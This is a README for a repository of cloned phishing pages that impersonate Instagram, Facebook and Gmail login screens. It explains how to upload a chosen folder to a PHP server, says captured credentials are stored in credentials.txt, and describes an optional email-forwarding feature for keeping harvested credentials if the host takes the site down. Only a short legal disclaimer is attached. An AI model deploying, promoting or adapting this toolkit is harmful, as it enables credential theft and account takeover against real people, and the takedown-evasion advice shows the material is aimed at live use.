# Phishing Websites

Collection of popular phishing websites.

## List of websites

- Instagram
  - [v. 2022-07-21 (en)](./instagram/)
- Facebook
  - [v. 2022-07-20 (en)](./facebook/)
  - [v. 2019-06-01 (it)](./old_versions/facebook_2019-06-01/)
- Gmail
  - [v. 2019-06-01 (en)](./old_versions/gmail_2019-06-01/)

## Usage

1. Clone the repository

    ```bash
    git clone https://github.com/tassoneroberto/phishing-websites.git
    ```

2. Choose the website (e.g. `facebook/`)

3. Upload the entire content of the selected folder to a PHP webserver

4. The system will store the credentials in the file `credentials.txt`. You can rename it by editing the file `post.php`

### Optional

If you want to receive the credentials by email you have to uncomment this feature in `post.php`. This is useful to prevent to lose the collected credentials in case the web host decides to ban/delete the website

## Legal disclaimer

Usage of this websites for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
